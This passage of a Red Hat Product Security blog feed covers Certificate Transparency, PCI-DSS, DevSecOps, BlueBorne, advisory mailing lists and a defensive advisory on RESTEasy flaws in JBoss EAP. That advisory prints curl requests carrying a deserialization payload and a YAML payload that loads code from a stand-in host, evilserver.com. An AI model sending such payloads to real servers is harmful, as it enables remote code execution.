href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154677\">B1046 - I'm a developer. What do I need to know about security?</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154713\">B1048 - Provenance and Deployment Policy</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153840\">B1062 - The Red Hat Security BoF - Ask us (most) anything</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154439\">B1036 - Virtualization: a study</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=163864\">B2112 - Shift security left - and right - in the container lifecycle</a></p>\n<h3>Security Panels</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154730\">P1757 - DevSecOps with disconnected OpenShift</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154835\">P1041 - Making IoT real across industries</a></p>\n<h3>Security Workshops</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154040\">W1025 - Satellite and Insights Test-drive</a></p>\n<p>On top of the sessions, Red Hat Product Security will be there playing fun educational games like our Flawed and Branded card game and the famous GAME SHOW! GAME SHOW!</p>\n<p>No matter what your interest or specialty is, Red Hat Summit definitely has something for you.  Come learn more about the security features and practices around our products!  We're looking forward to seeing you there!</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3418921\"></div>","pubDate":"Mon, 23 Apr 2018 14:30:00 +0000","dc:creator":"Christopher Robinson","guid":{"@isPermaLink":"false","#text":"3418921 at https://access.redhat.com"}},{"title":"Certificate Transparency and HTTPS","link":"https://access.redhat.com/blogs/766093/posts/3415231","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p><a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fgroups.google.com%2Fa%2Fchromium.org%2Fforum%2F%23%21topic%2Fct-policy%2FwHILiYf31DE\">Google has announced</a> that on April 30, 2018, Chrome will:</p>\n<blockquote><p>“...require that all TLS server certificates issued after 30 April, 2018 be compliant with the Chromium CT Policy. After this date, when Chrome connects to a site serving a publicly-trusted certificate that is not compliant with the Chromium CT Policy, users will begin seeing a full page interstitial indicating their connection is not CT-compliant. Sub-resources served over https connections that are not CT-compliant will fail to load and will show an error in Chrome DevTools.”</p>\n</blockquote>\n<p>So what exactly does this mean, and why should one care?</p>\n<h2>What is a CT policy?</h2>\n<p>CT stands for “Certificate Transparency” and, in simple terms, means that all certificates for websites will need to be registered by the issuing <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCertificate_Authority\">Certificate Authority</a> (CA) in at least two public Certificate Logs.</p>\n<p>When a CA issues a certificate, it now must make a public statement in a trusted database (the Certificate Log) that, at a certain date and time, they issued a certificate for some site. The reason is for more than a year many different CAs have issued certificates for sites and names for which they shouldn’t (like “localhost” or “1.2.3.”) or have issued certificates following fraudulent requests (e.g. people who are not BigBank asking for certificates for bigbank.example.com). By placing all requested certificates into these Certificate Logs, other groups, such as security researchers and companies, can monitor what is being issued and raise red flags as needed (e.g. if you see a certificate issued for your domain, which you did not request).</p>\n<p>If you do not announce your certificates in these Certificate Logs, the Chrome web browser will generate an error page that the user must click through before going to the page they were trying to load, and if a page contains elements (e.g. from advertising networks) that are served from non CT-compliant domains, they will simply not be loaded.</p>\n<h2>Why is Google doing this?</h2>\n<p>Well there are probably several reasons but the main ones are:</p>\n<ol>\n<li>\n<p>As noted, several CAs have been discovered issuing certificates wrongly or fraudulently, putting Internet users at risk. This technical solution will greatly reduce the risk as such wrong or fraudulently issued certificates can be detected quickly.</p>\n</li>\n<li>\n<p>More importantly, this prepares for a major change coming to the Chrome web browser in July 2018, in which all <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCertificate_Authority\">HTTP</a> websites will be labeled as “INSECURE”, which should significantly drive up the adoption of <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FHTTPS\">HTTPS</a>. This adoption will, of course, result in a flood of new certificates which, combined with the oversight provided by Certificate Logs, should help to catch fraudulently or wrongly-obtained certificates.</p>\n</li>\n</ol>\n<h2>What should a web server operator do?</h2>\n<p>The first step is to identify your web properties, both external facing and internal facing. Then it’s simply a matter of determining whether you:</p>\n<p>want the certificate for a website to show up in the Certificate Log so that the Chrome web browser does not generate an error (e.g. your public facing web sites will want this), or absolutely do not want that particular certificate to show up in the Certificate Logs (e.g. a sensitive internal host), and you’re willing to live with Chrome errors.</p>\n<p>Depending on how your certificates are issued, and who issued them, you may have some time before this becomes an issue (e.g. if you are using a service that issues short lived certificates you definitely will be affected by this). Also please note that some certificate issuers like Amazon’s AWS Certificate Manager do allow you to choose to opt out of reporting them to the Certificate Logs, a useful feature for certificates being used on systems that are “internal” and you do not want the world to know about.</p>\n<p>It should be noted that in the long term, option 2 (not reporting certificates to the Certificate Logs) will become increasingly problematic as it is possible that Google may simply have Chrome block them rather than generate an error. So, with that in mind, now is probably a good time to start determining how your security posture will change when all your HTTPS-based hosts are effectively being enumerated publicly. You will also need to determine what to do with any HTTP web sites, as they will start being labelled as “INSECURE” within the next few months, and you may need to deploy HTTPS for them, again resulting in them potentially showing up in the Certificate Logs.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3415231\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    https</div><div class=\"field field-name-field-kcs-component-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tComponent\t</h2>\n\n    httpd</div>","pubDate":"Tue, 17 Apr 2018 15:00:01 +0000","dc:creator":"Kurt Seifried","guid":{"@isPermaLink":"false","#text":"3415231 at https://access.redhat.com"}},{"title":"Let's talk about PCI-DSS","link":"https://access.redhat.com/blogs/766093/posts/3358681","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>For those who aren’t familiar with <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FPayment_Card_Industry_Data_Security_Standard\">Payment Card Industry Data Security Standard</a> (PCI-DSS), it is the standard that is intended to protect our credit card data as it flows between systems and is stored in company databases.  PCI-DSS requires that all vulnerabilities rated equal to, or higher than, CVSS 4.0 must be addressed by PCI-DSS compliant organizations (notably, those which process and/or store cardholder data).  While this was done with the best of intentions, it has had an impact on many organizations' capability to remediate these vulnerabilities in their environment.</p>\n<p>The qualitative severity ratings of vulnerabilities as categorized by Red Hat Product Security do not directly align with the baseline ratings recommended by CVSS. These CVSS scores and ratings are used by PCI-DSS and most scanning tools.  As a result, there may be cases where a vulnerability which would be rated as low severity by Red Hat, may exceed the CVSS’ recommended threshold for PCI-DSS.</p>\n<p>Red Hat has published guidelines on <a href=\"https://access.redhat.com/security/updates/classification/\">vulnerability classification</a>.  Red Hat Product Security prioritizes focus of security flaw remediation on Critical and Important vulnerabilities, which provide compromise to confidentiality, data, and/or availability.  This is not intended to downplay the importance of lower severity vulnerabilities, but rather, aims to target those risks which are seen as most important by our customers and industry at large. CVSS ratings for vulnerabilities build upon a set of assumptions, factoring in a worst-case scenario (i.e. the CVSS calculator leaves all Temporal and Environmental factors set to “undefined”) possibly resulting in an environment that has no security mitigations or blocking controls in place, which might not be an accurate representation of your environment.  Specifically, a given flaw may be less significant in your application depending how the function is used, whether it is exposed to untrusted data, or whether it enforces a privilege boundary.   It is Red Hat’s position, that the base CVSS scores alone cannot reliably be used to fully capture the importance of flaws in every use case.</p>\n<p>In most cases, security issues will be addressed when updates are available upstream.  However, as noted above, there may be cases where a vulnerability rated as low severity by Red Hat, may exceed the CVSS’ threshold for vulnerability mitigation by the PCI-DSS standard and be considered actionable by a security scanner or during an audit by a Qualified Scanning Auditor (QSA).</p>\n<p>In light of the above, Red Hat does not claim any of its products meet PCI-DSS compliance requirements.  We do strive to provide secure software solutions and guidance to help remediate vulnerabilities of notable importance to our customers.</p>\n<p>When there is a discrepancy in the  security flaw ratings, we suggest the following:</p>\n<ul>\n<li>\n<p>Harden your system: Determine if the component is needed or used.  In many cases, scans will pick up on packages which are included in the distribution but do not need to be deployed in the production environment.  If customers can remove these packages, or replace with another unaffected package, without impacting their functional system, they reduce the attack surface and reduce the number of components which might be targeted.</p>\n</li>\n<li>\n<p>Validate the application: <a href=\"https://access.redhat.com/blogs/766093/posts/2998921\">Determine if the situation is a false positive.</a> (Red Hat often backports fixes which may result in false positives for version-detecting scanning products).</p>\n</li>\n<li>\n<p>Self-evaluate the severity: Update the base CVSS score by calculating  the environmental factors that are relevant, document the updated CVSS score for the vulnerability respective to your environment. All CVSS vector strings in our CVE pages link to the CVSS calculator on FIRST's website, with the base score pre-populated so that customers just need to fill in their other metrics.</p>\n</li>\n<li>\n<p>Implement other controls to limit (or eliminate) exposure of the vulnerable interface or system.</p>\n</li>\n</ul>\n<p>Further technical information to make these determinations can often be found from product support, in the various technical articles and blogs Red Hat makes available, in CVE pages’ Statement or Mitigation sections and in Bugzilla tickets. Customers with support agreements can reach out to product support for additional assistance to evaluate the potential risk for their environment, and confirm if the vulnerability jeopardizes the confidentiality of PCI-DSS data.</p>\n<p>Red Hat recognizes vulnerability scores and impacts may differ, and are there to help you assess your environment.  As a customer, you can open a support case and provide us the feedback that matters to you. Our support and product teams value this feedback and will use it to provide better results.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3358681\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div>","pubDate":"Wed, 28 Feb 2018 14:30:00 +0000","dc:creator":"Langley Rock","guid":{"@isPermaLink":"false","#text":"3358681 at https://access.redhat.com"}},{"title":"Security is from Mars, Developers are from Venus…...or ARE they?","link":"https://access.redhat.com/blogs/766093/posts/3242921","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>It is a tale as old as time.  Developers and security personnel view each other with  suspicion.  The perception is that a vast gulf of understanding and ability lies between the two camps.  “They can’t possibly understand what it is to do my job!” is a surprisingly common statement tossed about.  Both groups blame the other for being the source of all of their ills.  It has been well-known that fixing security bugs early in the development lifecycle not only helps eliminate exposure to potential vulnerabilities, but it also <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fresources.sei.cmu.edu%2Fasset_files%2FWhitePaper%2F2013_019_001_295670.pdf\">saves time, effort, and money</a>.  Once a defect escapes into production it can be very costly to remediate.</p>\n<p>Years of siloing and specialization have driven deep wedges between these two critical groups.  Both teams have the same goal: to enable the business. They just take slightly different paths to get there and have different expertise and focus.  In the last few decades we’ve all been forced to work more closely together, with movements like Agile reminding everyone that we’re <strong>all</strong> ultimately there to serve the business and the best interest of our customers.  Today, with the overwhelming drive to move to a DevOps model, to get features and functionality out into the hands of our customers faster, we <strong>must</strong> work better together to make the whole organization succeed.</p>\n<p>Through this DevOps shift in mindset (Development and Operations working more closely on building, deploying, and maintaining software), both groups have influenced each other’s thinking.  Security has started to embrace the benefits of things like iterative releases and continuous deployments, while our coder-counterparts have expanded their test-driven development methods to include more automation of security test cases and have become more mindful of things like the <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FCategory%3AOWASP_Top_Ten_Project\">OWASP Top 10</a> (the Open Web Application Security Project).  We are truly on the brink of a DevSecOps arena where we can have fruitful collaboration from the groups that are behind the engine that drives our respective companies.  Those that can embrace this exciting new world are poised to reap the benefits.</p>\n<p>Red Hat Product Security is pleased to partner with our friends over in the Red Hat Developer Program.  Our peers there are driving innovation in the open source development communities and bringing open source to a new generation of software engineers.  It is breathtaking to see the collaboration and ideas that are emerging in this space.  We’re also equally pleased that security is not just an afterthought for them.  Developing and composing software that considers “security by design” from the earliest stages of the development lifecycle helps projects move faster while delivering innovative and secure solutions.  They have recently kicked-off a new site topic that focuses on secure programing and we expect it to be a great resource within the development community: <a href=\"https://developers.redhat.com/topics/security/\">Secure Programming at the Red Hat Developer Program</a>.</p>\n<p>In this dedicated space of our developer portal you’ll find a wealth of resources to help coders code with security in mind.  You’ll find blogs from noted luminaries. You’ll find defensive coding guides, and other technical materials that will explain how to avoid common coding flaws that could develop into future software vulnerabilities. You’ll also be able to directly engage with Red Hat Developers and other open source communities.  This is a great time to establish that partnership and “reach across the aisle” to each other.  So whether you are interested in being a better software engineer and writing more secure code, or are looking to advocate for these techniques, Red Hat has a fantastic set of resources to help guide you toward a more secure future!</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3242921\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    Security-Vulnerabilities</div>","pubDate":"Thu, 16 Nov 2017 15:00:00 +0000","dc:creator":"Christopher Robinson","guid":{"@isPermaLink":"false","#text":"3242921 at https://access.redhat.com"}},{"title":"Abuse of RESTEasy Default Providers in JBoss EAP","link":"https://access.redhat.com/blogs/766093/posts/3162112","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Red Hat JBoss Enterprise Application Platform (EAP) is a commonly used host for Restful webservices. A powerful but potentially dangerous feature of Restful webservices on JBoss EAP is the ability to accept any media type. If not configured to accept only a specific media type, JBoss EAP will dynamically process the request with the default provider matching the <code>Content-Type</code> HTTP Header which the client specifies. Some of the default providers where found to have vulnerabilities which have now been removed from JBoss EAP and it's upstream Restful webservice project, RESTEasy.</p>\n<h2>The attack vector</h2>\n<p>There are two important vulnerabilities fixed in the RESTEasy project in 2016 which utilized default providers as an attack vector. <a href=\"https://access.redhat.com/security/cve/CVE-2016-7050\">CVE-2016-7050</a> was fixed in version 3.0.15.Final, while <a href=\"https://access.redhat.com/security/cve/CVE-2016-7050\">CVE-2016-9606</a> was fixed in version 3.0.22.Final. Both vulnerabilities took advantage of the default providers available in RESTEasy. They relied on a webservice endpoint doing the following:</p>\n<ul>\n<li>@Consumes annotation was present specifying wildcard mediaType <code>{*/*}</code></li>\n<li>@Consumes annotation was not present on webservice endpoint</li>\n<li>Webservice endpoint consumes a multipart mediaType</li>\n</ul>\n<p>Here's an example of what a vulnerable webservice would look like:</p>\n<pre><code>import java.util.*;\nimport javax.ws.rs.*;\nimport javax.ws.rs.core.*;\n\n@Path(\"/\")\npublic class PoC_resource {\n\n        @POST\n        @Path(\"/concat\")\n        public Map&lt;String, String&gt; doConcat(Pair pair) {\n                HashMap&lt;String, String&gt; result = new HashMap&lt;String, String&gt;();\n                result.put(\"Result\", pair.getP1() + pair.getP2());\n                return result;\n        }\n\n}\n</code></pre><p><em>Notice how there is no @Consumes annotation on the doConcat method.</em></p>\n<h2>The vulnerabilities</h2>\n<p>CVE-2016-7050 took advantage of the deserialization capabilities of SerializableProvider. It was fixed upstream<sup id=\"fnref:1\"><a href=\"#fn:1\" class=\"footnote-ref\">1</a></sup> before Product Security became aware of it. Luckily, the RESTEasy version used in the supported version of JBoss EAP 7 was later than 3.0.15.Final, so it was not affected. It was reported to Red Hat by Mikhail Egorov of Odin.</p>\n<p>If a Restful webservice endpoint wasn't configured with a @Consumes annotation, an attacker could utilize the SerializableProvider by sending a HTTP Request with a <code>Content-Type</code> of <code>application/x-java-serialized-object</code>. The body of that request would be processed by the SerializationProvider and could contain a malicious payload generated with ysoserial<sup id=\"fnref:2\"><a href=\"#fn:2\" class=\"footnote-ref\">2</a></sup> or similar. A remote code execution on the server could occur as long as there was a gadget chain on the classpath of the web service application.</p>\n<p>Here's an example:</p>\n<pre><code>curl -v -X POST http://localhost:8080/example/concat -H 'Content-Type: application/x-java-serialized-object' -H 'Expect:' --data-binary '@payload.ser'\n</code></pre><p>CVE-2016-9606 also exploited the default providers of Resteasy. This time it was the YamlProvider which was the target of abuse. This vulnerability was easier to exploit because it didn't require the application to have a gadget chain library on the classpath. Instead, the Snakeyaml library from Resteasy was being exploited directly to allow remote code execution. This issue was reported to Red Hat Product Security by Moritz Bechler of AgNO3 GmbH &amp; Co. KG.</p>\n<p>SnakeYaml allows loading classes with a URLClassloader, using it's ScriptEngineManager feature. With this feature, a malicious actor could host malicious Java code on their own web server and trick the webservice into loading that Java code and executing it.</p>\n<p>An example of a malicious request is as follows:</p>\n<pre><code>curl -X POST --data-binary '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evilserver.com/\"]]]]' -H \"Content-Type: text/x-yaml\" -v http://localhost:8080/example/concat\n</code></pre><p><em>Where evilserver.com is a host controlled by the malicious actor</em></p>\n<p>Again, you can see the use of <code>Content-Type</code>, HTTP Header, which tricks RESTEasy into using YamlProvider, even though the developer didn't intend for it to be accessible.</p>\n<h2>How to stay safe</h2>\n<p>The latest versions of EAP 6.4.x, and 7.0.x are not affected by these issues. CVE-2016-9606 did affect EAP 6.4.x; it was fixed in the 6.4.15 release. CVE-2016-9606 was not exploitable on EAP 7.0.x, but we found it was possible to exploit on 7.1 and is now fixed in the 7.1.0.Beta release. CVE-2016-7050 didn't affect either of EAP 6.4.x, or 7.0.x.</p>\n<p>If you're using an unpatched release of upstream RESTEasy, be sure to specify the mediaType you're expecting when defining the Restful webservice endpoint. Here's an example of an endpoint that would not be vulnerable:</p>\n<pre><code>import java.util.*;\nimport javax.ws.rs.*;\nimport javax.ws.rs.core.*;\n\n@Path(\"/\")\npublic class PoC_resource {\n\n        @POST\n        @Path(\"/concat\")\n        @Consumes(\"application/json\")\n        public Map&lt;String, String&gt; doConcat(Pair pair) {\n                HashMap&lt;String, String&gt; result = new HashMap&lt;String, String&gt;();\n                result.put(\"Result\", pair.getP1() + pair.getP2());\n                return result;\n        }\n\n}\n</code></pre><p><em>Notice this safe version added a @Consumes annotation with a mediaType of <code>application/json</code></em></p>\n<p>This is good practice anyway, because if a HTTP client tries to send a request with a different Content-Type HTTP Header the application will give an appropriate error response, indicating that the Content-Type is not supported.</p>\n<div class=\"footnotes\">\n<hr />\n<ol>\n<li id=\"fn:1\">\n<p>https://issues.jboss.org/browse/RESTEASY-1269 <a href=\"#fnref:1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn:2\">\n<p>https://github.com/frohoff/ysoserial <a href=\"#fnref:2\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</div></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3162112\"></div><div class=\"field field-name-field-product field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tProduct\t</h2>\n\n    Red Hat JBoss Enterprise Application Platform</div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    jaxrs    webservices</div>","pubDate":"Wed, 18 Oct 2017 13:30:00 +0000","dc:creator":"Jason Shepherd","guid":{"@isPermaLink":"false","#text":"3162112 at https://access.redhat.com"}},{"title":"Kernel Stack Protector and BlueBorne","link":"https://access.redhat.com/blogs/product-security/posts/blueborne","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Today, a security issue called BlueBorne was disclosed, a vulnerability that could be used to attack sensitive systems via the Bluetooth protocol. Specifically, BlueBorne is a flaw where a remote (but physically quite close) attacker could get root on a server, without an internet connection or authentication, via installed and active Bluetooth hardware.</p>\n<p>The key phrase is “has the potential.” BlueBorne is still a serious flaw and one that requires patching and remediation, but most Red Hat Enterprise Linux users are at less risk of a direct attack. This is because Bluetooth hardware is not particularly common on servers, and our Server distributions of Red Hat Enterprise Linux don’t enable Bluetooth by default. But what about the desktop and workstation users of Red Hat Enterprise Linux and many other Linux distributions?</p>\n<p>Laptops and desktop machines commonly have Bluetooth hardware, and Workstation variants of Red Hat Enterprise Linux enable Bluetooth by default. It’s possible that a malicious actor could use a remote Bluetooth connector to gain access to personal workstations or terminals in an office building, allowing them to gain root for accessing sensitive data or potentially causing a cascading, system-wide attack. This is unlikely, however, on Linux operating systems, including Red Hat Enterprise Linux, thanks to  <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fgcc.gnu.org%2Fgcc-4.1%2Fchanges.html%23obsolete_systems\">Stack Protection</a>.</p>\n<p>Stack Protection has been available for some time, having been introduced in some distributions back in 2005. We believe most major vendor distributions build their Linux kernels with Stack Protection enabled. For us, this includes Fedora Core (since version 5) and Red Hat Enterprise Linux (since version 6).  With a kernel compiled in this way, the flaw turns from remote code execution to a remote crash (kernel panic). While having a physically local attacker being able to cause your machines to crash without touching them is bad, but it’s certainly not as bad as remote root.</p>\n<p>Red Hat, along with other Linux distribution vendors and the upstream Kernel security team, received one week advance notice on BlueBorne in order to prepare patches and updates. We used this time to evaluate the issue, develop the fix and build and test updated packages for supported versions of Red Hat Enterprise Linux. We also used the time to provide clearly understood information about the flaw, and how it impacted our products, which can be found in the Vulnerability Article noted below.</p>\n<p>Because Stack Protection works by adding a single check value (a canary) to the stack before the return address, a buffer overflow could overwrite other buffers on the stack before that canary depending on how things get ordered, so it was important for us to check properly. Based on a technical investigation we concluded that with Stack Protection enabled, it would be quite unlikely to be able to exploit this to gain code execution. We can’t completely rule it out, though, as an attacker may be able to use some other mechanism to bypass it (for example, if they can determine the value of the stack canary, maybe a race condition, combining it with some other flaw).</p>\n<p>On some architectures, notably ppc64 and s390x for Red Hat Enterprise Linux, Stack Protection is not used. However the Bluetooth kernel module is not available for our s390x Server variant. And ppc64 is only available in a Server variant, which doesn’t install the bluez package, making it not vulnerable by default even if Bluetooth hardware happens to be present.</p>\n<p>So if most distributions build kernels with Stack Protection, and Stack Protection has been available for many years before the flaw was introduced, where is the risk?  Well, the problem is going to be all those kernels that have been built without Stack Protection turned on. So things like IoT devices that are Bluetooth enabled along with a vulnerable kernel compiled without Stack Protection will be most at risk from this flaw.</p>\n<p><strong>Regardless of whether you have Stack Protection or not, patch your system. BlueBorne remains an important flaw and one that needs to be remedied as soon as possible via the appropriate updates.</strong></p>\n<p>For Red Hat customers our page <a href=\"https://access.redhat.com/security/vulnerabilities/blueborne\">https://access.redhat.com/security/vulnerabilities/blueborne</a> contains information on the patches we released today along with other details and mitigations.  We’d like to thank Armis Labs for reporting this vulnerability.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3179631\"></div>","pubDate":"Tue, 12 Sep 2017 11:51:33 +0000","dc:creator":"Red Hat Product Security","guid":{"@isPermaLink":"false","#text":"3179631 at https://access.redhat.com"}},{"title":"The RHSA notifications you want, right in your Inbox","link":"https://access.redhat.com/blogs/product-security/posts/rhsa-announce","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p><a href=\"https://access.redhat.com/security/\">Red Hat Product Security</a> takes pride in the quality and timeliness of its <a href=\"https://access.redhat.com/security/security-updates/#/security-advisories\">Security Advisories</a> and all the accompanying information we publish for every erratum and <a href=\"https://access.redhat.com/security/security-updates/#/cve\">vulnerability</a> that we track and fix in our products.  There are many ways in which customers and the general public can get notified about those advisories and errata and one of the most commonly used is the <a href=\"https://www.redhat.com/mailman/listinfo/rhsa-announce\">rhsa-announce mailing list</a>.  This list has been around for nearly 10 years, and we have recently taken steps to increase its usefulness for a wider variety of subscribers.</p>\n<h2>E Pluribus Mail Unum</h2>\n<p>The rhsa-announce mailing list was <a href=\"https://www.redhat.com/archives/rhsa-announce/2007-November/msg00000.html\">created in November of 2007</a> with the purpose of delivering information about all security advisories published by Red Hat regardless of the product family they affected.  Before rhsa-announce there were two mailing lists, <a href=\"https://www.redhat.com/mailman/listinfo/enterprise-watch-list\">enterprise-watch-list</a> and <a href=\"https://www.redhat.com/mailman/listinfo/jboss-watch-list\">jboss-watch-list</a>, with the latter having been created earlier that year (<a href=\"https://www.redhat.com/archives/jboss-watch-list/2007-March/msg00000.html\">March 2007</a>) and the former going way back to <a href=\"https://www.redhat.com/archives/enterprise-watch-list/2003-March/msg00000.html\">March 2003</a>.  That is <a href=\"https://www.redhat.com/archives/enterprise-watch-list/\">14 years of security advisories</a> archived publicly in a simple text format that makes it easy for search engines to index them.</p>\n<p>Over time our <a href=\"https://www.redhat.com/en/technologies\">product portfolio expanded</a> and new mailing lists were created, maintaining the usual behavior with rhsa-announce receiving all advisory email and the lists specific to a “product family” received only those that affected those particular products.  This led to the creation of <a href=\"https://www.redhat.com/mailman/listinfo/rhev-watch-list\">rhev-watch-list</a> and <a href=\"https://www.redhat.com/mailman/listinfo/storage-watch-list\">storage-watch-list</a> (anyone remembers <a href=\"https://www.redhat.com/mailman/listinfo/stronghold-watch-list\">stronghold-watch-list</a>?), which have been a little less popular (hundreds of subscribers) than the original ones (thousands of subscribers).</p>\n<p>As Red Hat’s product portfolio continues to expand this raised a few questions.  Are we just going to continue creating new lists?  How do we expect interested people to find out about those lists?  Is there a better way forward?  Well, it turns out there is: mailing lists managed by <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fmailman%2Ffeatures.html\">MailMan can support topics</a>, which is a way to create “sub-lists” inside a list by matching keywords in certain headers.  Subscribers can update the topics they subscribe to at any time without having to manage multiple subscriptions and perhaps multiple filters in their email clients.  <strong>We are therefore making rhsa-announce the one and only mailing list for all Red Hat Security Advisories</strong>, with topics support for selecting specific security impacts of the published errata, or specific product families one is interested in, starting on June 1st.</p>\n<p><strong>Call to Action:</strong> if you currently subscribe to any security advisory mailing list at Red Hat other than rhsa-announce, please unsubscribe from them and <a href=\"https://www.redhat.com/mailman/options/rhsa-announce\">select the topics you are interested in at rhsa-announce</a> instead.</p>\n<h2>Subscribing to Specific Topics in RHSA-Announce</h2>\n<p>Subscribing to rhsa-announce is very easy: just visit the <a href=\"https://www.redhat.com/mailman/listinfo/rhsa-announce\">mailing list information page</a> and follow the instructions in the “Subscribing to RHSA-announce” section; alternatively, send an email to <a href=\"mailto:rhsa-announce-request@redhat.com?subject=subscribe\">rhsa-announce-request@redhat.com</a> with a subject of “subscribe”.  Either method should send you a confirmation email with instructions to confirm your subscription.  The subscription section looks like this:</p>\n<p><img src=\"/sites/default/files/rhsa-announce-post-1.png?itok=nrvQ62j-\" width=\"480\" height=\"285\" alt=\"\" class=\"image-large\" /></p>\n<p>Once you are subscribed, go to the <a href=\"https://www.redhat.com/mailman/options/rhsa-announce\">subscription options page</a>, log in, and scroll down to the list of topics to select those that you are interested in (see the screen capture below).  You will need your rhsa-announce subscription password to access that page (the one you entered in the WebUI or that MailMan generated for you if you subscribed via email).  After selecting your topics of interest, click on “Submit My Changes” at the bottom of the page to save your options.</p>\n<p><img src=\"/sites/default/files/rhsa-announce-post-2.png?itok=tIzrvV5r\" width=\"480\" height=\"305\" alt=\"\" class=\"image-large\" /></p>\n<p>The topics for Critical, Important, Moderate, and Low severity issues match for every product so, for example, selecting “Critical Severity Issues” delivers email about advisories of Critical impact affecting every Red Hat product.  The topics for specific product lines match on every product in that group so “Middleware products issues” matches and delivers all advisory emails, of any severity, concerning our Middleware products.</p>\n<p>Unfortunately one cannot subscribe to intersections of topics; it is not possible to subscribe only to “Critical advisories for OpenStack” or similar. The topic subscription is a union of all topics selected.  Another detail worth mentioning is that MailMan topic filtering is sometimes “too inclusive”, and some advisories may match more than the expected topics, depending on the contents of some email headers.  Topics do not miss a product advisory email, though, they just may sometimes include messages for a product outside the expected group.</p>\n<p>If one wishes to <strong>un</strong>subscribe from rhsa-announce (or any other list hosted by Red Hat), that can also be done from the <a href=\"https://www.redhat.com/mailman/options/rhsa-announce\">list options page</a> or by sending an email to <a href=\"mailto:rhsa-announce-request@redhat.com?subject=unsubscribe\">rhsa-announce-request@redhat.com</a> with a subject of “unsubscribe”.  For other lists the operation is similar: just append “-request@redhat.com” to the list name to obtain the address to send the unsubscribe command to, such as <a href=\"mailto:enterprise-watch-list-request@redhat.com?subject=unsubscribe\">enterprise-watch-list-request@redhat.com</a>.</p>\n<p>Finally, it should be noted that rhsa-announce is not meant for general discussion of advisories; it is a read-only mailing list.  Questions regarding advisories can be sent to <a href=\"https://access.redhat.com/support/\">Red Hat Support</a> or to <a href=\"https://access.redhat.com/security/team/contact\">Red Hat Product Security</a>.</p>\n<h2>Other Sources of Errata Notifications and Vulnerability Information</h2>\n<p>While we’re on the subject of receiving notifications about Red Hat Security Advisories and our security errata, it should be mentioned that email is not the only way to get that information.  The <a href=\"https://access.redhat.com/security/\">Product Security section of the Red Hat Customer Portal</a> contains a wealth of information about our <a href=\"https://access.redhat.com/security/security-updates/#/security-advisories\">advisories</a>, <a href=\"https://access.redhat.com/security/security-updates/#/cve\">individual CVEs</a>, <a href=\"https://access.redhat.com/blogs/product-security\">blog posts</a>, and more.  <a 